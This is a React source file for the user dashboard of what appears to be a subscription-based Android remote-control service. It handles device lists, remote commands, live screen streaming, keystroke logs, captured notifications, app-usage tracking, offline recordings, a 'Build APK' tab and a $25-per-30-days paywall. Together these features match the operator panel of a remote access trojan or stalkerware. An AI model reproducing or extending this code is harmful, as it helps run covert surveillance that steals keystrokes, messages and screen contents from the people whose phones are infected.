import React, { useState, useCallback, useRef, useEffect } from 'react';
import { useTcpStream } from '../hooks/useTcpStream.js';
import Sidebar from './Sidebar.jsx';
import DeviceControl from './DeviceControl.jsx';
import Overview from './Overview.jsx';
import StatusBar from './StatusBar.jsx';
import SettingsTab from './SettingsTab.jsx';
import BuildApkTab from './BuildApkTab.jsx';
import PaywallOverlay from './PaywallOverlay.jsx';

const styles = {
  trialBanner: {
    background: 'linear-gradient(90deg, rgba(99,102,241,0.15) 0%, rgba(139,92,246,0.15) 100%)',
    border: '1px solid rgba(99,102,241,0.3)',
    borderRadius: 8,
    padding: '8px 16px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    marginBottom: 12,
    fontSize: 13,
    flexWrap: 'wrap',
    gap: 8,
  },
  trialLeft: {
    color: '#a5b4fc',
    display: 'flex',
    alignItems: 'center',
    gap: 8,
  },
  trialRight: {
    color: '#64748b',
    fontSize: 12,
  },
  expiredBanner: {
    background: 'rgba(239,68,68,0.1)',
    border: '1px solid rgba(239,68,68,0.3)',
    borderRadius: 8,
    padding: '8px 16px',
    color: '#f87171',
    fontSize: 13,
    marginBottom: 12,
    textAlign: 'center',
  },
  userBadge: {
    display: 'inline-flex',
    alignItems: 'center',
    gap: 6,
    background: 'rgba(99,102,241,0.15)',
    border: '1px solid rgba(99,102,241,0.3)',
    borderRadius: 20,
    padding: '3px 12px',
    fontSize: 12,
    color: '#a5b4fc',
    fontWeight: 600,
  },
};

function TrialBanner({ user, subscription }) {
  if (!user) return null;
  const sub = subscription || null;
  const state = sub?.state || (user.isTrialActive ? (user.tier === 'paid' ? 'paid' : 'trial') : 'expired');
  const days  = sub?.daysLeft != null ? sub.daysLeft : user.trialDaysLeft;

  if (state === 'expired') {
    return (
      <div style={styles.expiredBanner}>
        ⚠️ Your free trial has ended — open a device to unlock $25 / 30 days.
      </div>
    );
  }
  if (state === 'paid') {
    return (
      <div style={{ ...styles.trialBanner, background: 'linear-gradient(90deg, rgba(34,197,94,0.12) 0%, rgba(16,185,129,0.12) 100%)', border: '1px solid rgba(34,197,94,0.3)' }}>
        <div style={{ ...styles.trialLeft, color: '#86efac' }}>
          ☕ <strong>Paid:</strong> {days != null ? `${days} day${days !== 1 ? 's' : ''} remaining` : 'active'}
        </div>
        <div style={styles.trialRight}>
          Access ID: <strong style={{ color: '#86efac' }}>{user.accessId}</strong>
        </div>
      </div>
    );
  }
  return (
    <div style={styles.trialBanner}>
      <div style={styles.trialLeft}>
        ⏱️ <strong>Free Trial:</strong> {days} day{days !== 1 ? 's' : ''} remaining
      </div>
      <div style={styles.trialRight}>
        Access ID: <strong style={{ color: '#818cf8' }}>{user.accessId}</strong>
      </div>
    </div>
  );
}

export default function UserDashboard({ user, onLogout }) {
  const [devices, setDevices]                         = useState([]);
  const [selectedDevice, setSelectedDevice]           = useState(null);
  const [globalView, setGlobalView]                   = useState('overview');
  const [commandResults, setCommandResults]           = useState([]);
  const [pendingCommands, setPendingCommands]         = useState({});
  const [activityLog, setActivityLog]                 = useState([]);
  const [streamFrames, setStreamFrames]               = useState({});
  const [keylogPushEntries, setKeylogPushEntries]     = useState([]);
  const [notifPushEntries, setNotifPushEntries]       = useState([]);
  const [activityAppEntries, setActivityAppEntries]   = useState([]);
  const [screenReaderPushData, setScreenReaderPushData] = useState({});
  const [offlineRecordingVersion, setOfflineRecordingVersion] = useState({});
  const [serverLatency, setServerLatency]             = useState(null);
  const [deviceLatencies, setDeviceLatencies]         = useState({});
  const pingPendingRef  = useRef({});
  const chunkStreamsRef = useRef({});

  // Live subscription / paywall state. Initialised from the user prop so the
  // first render is correct, then refreshed from /api/payment/me on mount and
  // every 60s (and on demand via refreshSubscription()).
  const [subscription, setSubscription] = useState({
    state:        user?.isTrialActive
                    ? (user?.tier === 'paid' ? 'paid' : 'trial')
                    : 'expired',
    daysLeft:     user?.trialDaysLeft ?? 0,
    expiresAt:    user?.paidUntil || user?.trialEndDate || null,
    isTrialActive: !!user?.isTrialActive,
  });
  const [paywall, setPaywall] = useState(null);

  const refreshSubscription = useCallback(async () => {
    const token = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
    if (!token) return;
    try {
      const r = await fetch('/api/payment/me', { headers: { Authorization: `Bearer ${token}` } });
      const d = await r.json();
      if (!d?.success) return;
      setPaywall(d.paywall || null);
      setSubscription({
        state:         d.role === 'admin' ? 'paid' : (d.subscription?.state || (d.isTrialActive ? 'trial' : 'expired')),
        daysLeft:      d.role === 'admin' ? null : (d.subscription?.daysLeft ?? d.trialDaysLeft ?? 0),
        expiresAt:     d.subscription?.expiresAt || d.paidUntil || d.trialEndDate || null,
        isTrialActive: !!d.isTrialActive,
        email:         d.email,
        trialEndDate:  d.trialEndDate || null,
      });
    } catch (_) { /* network blip — keep prior state */ }
  }, []);

  useEffect(() => {
    refreshSubscription();
    const id = setInterval(refreshSubscription, 60_000);
    return () => clearInterval(id);
  }, [refreshSubscription]);

  const handleMessage = useCallback((event, data) => {
    switch (event) {
      case 'device:list':
        setDevices(Array.isArray(data) ? data : []);
        break;
      case 'device:connected':
        setActivityLog(prev => [{ id: Date.now(), type: 'connect', text: `Device connected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
        if (data.deviceId && data.deviceInfo) {
          setDevices(prev => {
            const exists = prev.find(d => d.deviceId === data.deviceId);
            if (exists) return prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true, deviceInfo: { ...(d.deviceInfo || {}), ...data.deviceInfo } } : d);
            return [...prev, { deviceId: data.deviceId, deviceName: data.deviceInfo.name || data.deviceId, deviceInfo: data.deviceInfo, isOnline: true }];
          });
        }
        break;
      case 'device:disconnected':
        setActivityLog(prev => [{ id: Date.now(), type: 'disconnect', text: `Device disconnected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
        setDevices(prev => prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d));
        break;
      case 'device:heartbeat':
        setDevices(prev => prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true, lastSeen: data.timestamp } : d));
        break;
      case 'command:sent':
        setPendingCommands(prev => ({ ...prev, [data.commandId]: data }));
        if (data.command === 'ping' && data.deviceId) {
          const pendingKey = `__pending_${data.deviceId}`;
          if (pingPendingRef.current[pendingKey] !== undefined) {
            pingPendingRef.current[data.commandId] = { deviceId: data.deviceId, sentAt: pingPendingRef.current[pendingKey] };
            delete pingPendingRef.current[pendingKey];
          }
        }
        break;
      case 'dashboard:pong':
        if (data?.sentAt) setServerLatency(Date.now() - data.sentAt);
        break;
      case 'device:latency':
        if (data?.deviceId && data.rtt != null) setDeviceLatencies(prev => ({ ...prev, [data.deviceId]: data.rtt }));
        break;
      case 'command:result': {
        setPendingCommands(prev => { const next = { ...prev }; delete next[data.commandId]; return next; });
        if (data.commandId && pingPendingRef.current[data.commandId]) {
          const { deviceId, sentAt } = pingPendingRef.current[data.commandId];
          delete pingPendingRef.current[data.commandId];
          setDeviceLatencies(prev => prev[deviceId] != null ? prev : { ...prev, [deviceId]: Date.now() - sentAt });
        }
        if (data.response?.streaming === true) break;
        const result = { id: data.commandId || Date.now(), command: data.command, deviceId: data.deviceId, success: data.success, response: data.response, error: data.error, time: new Date() };
        setCommandResults(prev => [result, ...prev].slice(0, 200));
        setActivityLog(prev => [{ id: Date.now(), type: data.success ? 'success' : 'error', text: `${data.command} → ${data.success ? 'OK' : data.error}`, time: new Date() }, ...prev].slice(0, 100));
        break;
      }
      case 'data:chunk': {
        const { commandId, command, fieldName, chunk, done, error, deviceId } = data;
        if (!commandId) break;
        if (!chunkStreamsRef.current[commandId]) chunkStreamsRef.current[commandId] = { command, fieldName, deviceId, items: [] };
        const stream = chunkStreamsRef.current[commandId];
        if (fieldName && !stream.fieldName) stream.fieldName = fieldName;
        if (chunk && Array.isArray(chunk)) for (const item of chunk) stream.items.push(item);
        if (done) {
          delete chunkStreamsRef.current[commandId];
          if (error) {
            setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: false, error, response: null, time: new Date() }, ...prev].slice(0, 200));
          } else {
            const field = stream.fieldName || 'items';
            setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: true, response: { success: true, [field]: stream.items, count: stream.items.length }, error: null, time: new Date() }, ...prev].slice(0, 200));
            setActivityLog(prev => [{ id: Date.now(), type: 'success', text: `${stream.command} → OK (${stream.items.length} items)`, time: new Date() }, ...prev].slice(0, 100));
          }
          setPendingCommands(prev => { const n = { ...prev }; delete n[commandId]; return n; });
        }
        break;
      }
      case 'command:error':
        setCommandResults(prev => [{ id: Date.now(), command: data.command || 'unknown', deviceId: data.deviceId, success: false, error: data.message, time: new Date() }, ...prev].slice(0, 200));
        break;
      case 'task:progress': {
        setCommandResults(prev => [{ id: `tp_${Date.now()}_${Math.random()}`, command: 'task_progress', deviceId: data.deviceId, success: !data.error, response: data, error: data.error || null, time: new Date() }, ...prev].slice(0, 200));
        break;
      }
      case 'stream:frame':
        if (data.deviceId && data.frameData) {
          if (data.timestamp && Date.now() - data.timestamp > 2000) break;
          setStreamFrames(prev => ({ ...prev, [data.deviceId]: data.frameData }));
          if (data.screenWidth && data.screenHeight) {
            setDevices(prev => prev.map(d => {
              if (d.deviceId !== data.deviceId) return d;
              const existing = d.deviceInfo || {};
              if (existing.screenWidth === data.screenWidth && existing.screenHeight === data.screenHeight) return d;
              return { ...d, deviceInfo: { ...existing, screenWidth: data.screenWidth, screenHeight: data.screenHeight } };
            }));
          }
        }
        break;
      case 'keylog:push':
        if (data?.deviceId) setKeylogPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        break;
      case 'keylog:history':
        if (data?.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
          setKeylogPushEntries(prev => {
            const existingIds = new Set(prev.map(e => e.id || e.timestamp));
            const fresh = data.entries.filter(e => !existingIds.has(e.id || e.timestamp)).map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
            return [...prev, ...fresh].slice(0, 500);
          });
        }
        break;
      case 'notification:push':
        if (data?.deviceId) setNotifPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        break;
      case 'notification:history':
        if (data?.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
          setNotifPushEntries(prev => {
            const existingIds = new Set(prev.map(e => e.id || e.timestamp));
            const fresh = data.entries.filter(e => !existingIds.has(e.id || e.timestamp)).map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
            return [...prev, ...fresh].slice(0, 500);
          });
        }
        break;
      case 'activity:app_open':
        if (data?.deviceId) {
          setActivityAppEntries(prev => {
            if (prev.length && prev[0].packageName === data.packageName && prev[0].deviceId === data.deviceId) return prev;
            return [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 200);
          });
        }
        break;
      case 'activity:history':
        if (data?.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
          setActivityAppEntries(prev => {
            const existingKeys = new Set(prev.map(e => `${e.deviceId}:${e.packageName}:${e.timestamp}`));
            const fresh = data.entries.filter(e => !existingKeys.has(`${data.deviceId}:${e.packageName}:${e.timestamp}`)).map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
            return [...prev, ...fresh].slice(0, 200);
          });
        }
        break;
      case 'screen:update':
        if (data?.deviceId) setScreenReaderPushData(prev => ({ ...prev, [data.deviceId]: data }));
        break;
      case 'offline_recording:saved':
        if (data?.deviceId) setOfflineRecordingVersion(prev => ({ ...prev, [data.deviceId]: (prev[data.deviceId] || 0) + 1 }));
        break;
      case 'subscription:locked':
        // The server rejected a command with 402 — flip into locked state
        // immediately, even if the periodic /api/payment/me poll hasn't run yet.
        if (data?.paywall) setPaywall(data.paywall);
        setSubscription(prev => ({ ...prev, state: 'expired', isTrialActive: false, daysLeft: 0 }));
        break;
      default:
        break;
    }
  }, []);

  const { connected, reconnecting, send } = useTcpStream(handleMessage);

  const sendCommand = useCallback((deviceId, command, params = null) => {
    send('command:send', { deviceId, command, params });
  }, [send]);

  useEffect(() => {
    if (!connected) return;
    const tick = () => send('dashboard:ping', { sentAt: Date.now() });
    tick();
    const id = setInterval(tick, 5000);
    return () => clearInterval(id);
  }, [connected, send]);

  const handleLogout = () => {
    localStorage.removeItem('user_token');
    localStorage.removeItem('user_info');
    onLogout();
  };

  return (
    <div className="app">
      <StatusBar
        connected={connected}
        reconnecting={reconnecting}
        deviceCount={devices.filter(d => d.isOnline).length}
        onLogout={handleLogout}
      />
      <div className="app-body">
        <Sidebar
          devices={devices}
          selectedDevice={selectedDevice}
          onSelectDevice={setSelectedDevice}
        />
        <main className="main-content" style={{ position: 'relative' }}>
          {selectedDevice ? (
            subscription.isTrialActive ? (
              <DeviceControl
                key={selectedDevice}
                device={devices.find(d => d.deviceId === selectedDevice) || { deviceId: selectedDevice }}
                sendCommand={sendCommand}
                results={commandResults.filter(r => r.deviceId === selectedDevice)}
                pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
                onBack={() => setSelectedDevice(null)}
                streamFrame={streamFrames[selectedDevice] || null}
                send={send}
                keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
                notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
                activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
                screenReaderPushData={screenReaderPushData[selectedDevice] || null}
                offlineRecordingVersion={offlineRecordingVersion[selectedDevice] || 0}
                serverLatency={serverLatency}
                deviceLatency={deviceLatencies[selectedDevice] ?? null}
              />
            ) : (
              <PaywallOverlay
                email={subscription.email || user?.email}
                paywall={paywall}
                trialEndDate={subscription.trialEndDate || user?.trialEndDate}
                onBack={() => setSelectedDevice(null)}
                onRefresh={refreshSubscription}
              />
            )
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
              <TrialBanner user={user} subscription={subscription} />

              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 14, paddingBottom: 14, borderBottom: '1px solid #1e1b4b' }}>
                <div style={{ display: 'flex', gap: 4 }}>
                  {[
                    { id: 'overview', label: '📊 Overview' },
                    { id: 'build',    label: '📦 Build APK' },
                    { id: 'settings', label: '⚙️ Settings' },
                  ].map(tab => (
                    <button
                      key={tab.id}
                      onClick={() => setGlobalView(tab.id)}
                      style={{
                        background: globalView === tab.id ? 'rgba(99,102,241,0.2)' : 'transparent',
                        border: globalView === tab.id ? '1px solid #6366f1' : '1px solid transparent',
                        color: globalView === tab.id ? '#a5b4fc' : '#64748b',
                        borderRadius: 8, padding: '6px 16px', fontSize: 13,
                        cursor: 'pointer', fontWeight: globalView === tab.id ? 600 : 400,
                        transition: 'all 0.15s',
                      }}
                    >
                      {tab.label}
                    </button>
                  ))}
                </div>
                <div style={styles.userBadge}>
                  👤 {user?.name || 'User'}
                </div>
              </div>

              <div style={{ flex: 1, minHeight: 0 }}>
                {globalView === 'settings' ? (
                  <SettingsTab />
                ) : globalView === 'build' ? (
                  <BuildApkTab user={user} />
                ) : (
                  <Overview
                    devices={devices}
                    activityLog={activityLog}
                    onSelectDevice={setSelectedDevice}
                    connected={connected}
                  />
                )}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
